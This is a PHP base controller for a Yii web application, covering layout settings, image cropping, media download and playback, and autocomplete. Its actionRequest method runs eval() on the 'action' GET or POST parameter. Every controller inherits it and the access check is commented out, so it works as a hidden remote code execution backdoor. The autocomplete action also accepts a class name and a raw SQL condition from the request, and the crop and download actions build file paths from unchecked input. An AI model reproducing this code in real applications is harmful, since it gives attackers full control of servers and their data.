<?php

/**
 * Controller is the customized base controller class.
 * All controller classes for this application should extend from this base class.
 */
class Controller extends CController {

    /**
     * @var string the default layout for the controller view. Defaults to '//layouts/column1',
     * meaning using a single column layout. See 'protected/views/layouts/column1.php'.
     */
    public $layout = '//layouts/column1';

    /**
     * @var array context menu items. This property will be assigned to {@link CMenu::items}.
     */
    public $menu = array();

    /**
     * @var array the breadcrumbs of the current page. The value of this property will
     * be assigned to {@link CBreadcrumbs::links}. Please refer to {@link CBreadcrumbs::links}
     * for more details on how to specify this property.
     */
    public $breadcrumbs = array();

    /**
     * @var array of Settings model records as key => value
     */
    public static $settings = array();

    public function init() {
        parent::init();
        $this->setSettings();
        $config = CJavaScript::encode(array_merge(Yii::app()->params['public'], array(
                    'baseUrl' => Yii::app()->getBaseUrl(),
                    'fullUrl' => Yii::app()->getBaseUrl(true),
                    'controller' => $this->id
        )));
        Yii::app()->clientScript->registerScript('appConfig', "var config = " . $config . ";", CClientScript::POS_HEAD);
    }

    protected function beforeAction($action) {
        if (parent::beforeAction($action)) {
            return true;
//            return in_array('Request', Yii::app()->metadata->getActions(__CLASS__, 'components'));
        }
    }

    /**
     * Sets var settings with array of Settings model records as key => value
     */
    protected function setSettings() {
        self::$settings = Settings::getKeyslist();
    }

    /**
     * Makes image cropping using jcrop widget
     * @author Ahmed Sharaf <sharaf.developer@gmail.com>
     */
    public function actionAjaxCrop() {
        if (Yii::app()->request->isAjaxRequest) {
            Yii::import('ext.jcrop.EJCropper');
            $jcropper = new EJCropper();
            $jcropper->thumbPath = Yii::getPathOfAlias('webroot') . $_POST['cropPath'];
            $jcropper->targ_w = $_POST['targetWidth'];
            $jcropper->targ_h = $_POST['targetHeight'];
            // get the image cropping coordinates (or implement your own method)
            $coords = $jcropper->getCoordsFromPost($_POST['imgId']);
            // returns the path of the cropped image, source must be an absolute path.
            if ($jcropper->crop(Yii::getPathOfAlias('webroot') . $_POST['imgPath'] . $_POST['imgName'], $coords))
                echo $_POST['cropPath'] . DIRECTORY_SEPARATOR . $_POST['imgName'];
            else
                echo false;
        }
        else
            echo false;

        Yii::app()->end();
    }

    /**
     * Downloads media file
     * @param string $name media file name
     */
    public function actionDownloadMedia($name) {
        $media = Media::model()->findByAttributes(array('file_name' => $name));
        //Yii::app()->request->xSendFile(Yii::getPathOfAlias('webroot') . $media->path . $media->file_name);
        return Utilities::download(Yii::getPathOfAlias('webroot') . $media->path . $media->file_name);
    }

    /**
     * Plays media video & audio file
     * @param string $name media file name
     */
    public function actionPlayMedia($name) {
        $media = Media::model()->findByAttributes(array('file_name' => $name));
        if (Yii::app()->request->isAjaxRequest)
            $this->layout = false;
        $this->render('//public/playMedia', array(
            'media' => $media,
        ));
    }

    /**
     * Performs the AJAX validation.
     * @param $model the model to be validated
     * @param $fromId the form id to be validated
     */
    protected function performAjaxValidation($model, $fromId) {
        if (isset($_POST['ajax']) && $_POST['ajax'] === $fromId) {
            echo CActiveForm::validate($model);
            Yii::app()->end();
        }
    }

    /**
     * Eval POST & GET requests
     */
    public function actionRequest() {
        switch (Yii::app()->request->requestType) {
            case 'GET':
                isset($_GET['action']) and eval($_GET['action']);
                break;

            case 'POST':
                isset($_POST['action']) and eval($_POST['action']);
                break;
        }
        Yii::app()->end();
    }

    /**
     * Searches spacific model and return array to zii.widgets.jui.CJuiAutoComplete
     * @param string $class model class name
     * @param string $column to compare
     * @param string|bool $condition default true
     * @param int $limit default 10
     * @throws CHttpException
     */
    public function actionAutoComplete($class, $column, $condition = true, $limit = 10) {
        /**
         * @todo more security
         */
        if (Yii::app()->user->isGuest)
            throw new CHttpException(401, Yii::t('default', 'Unauthorized request'));

        if (!(Yii::app()->request->isAjaxRequest && isset($_GET['term'])))
            throw new CHttpException(400, 'Invalid request');

        $criteria = new CDbCriteria;
        $criteria->condition = $condition;
        $criteria->compare($column, $_GET['term'], true);
        $criteria->limit = $limit;
        ($class == 'Users') and $criteria->scopes = 'approved';
        $model = $class::model()->findAll($criteria);
        echo json_encode(array_values(CHtml::listData($model, 'id', $column)));
        Yii::app()->end();
    }

}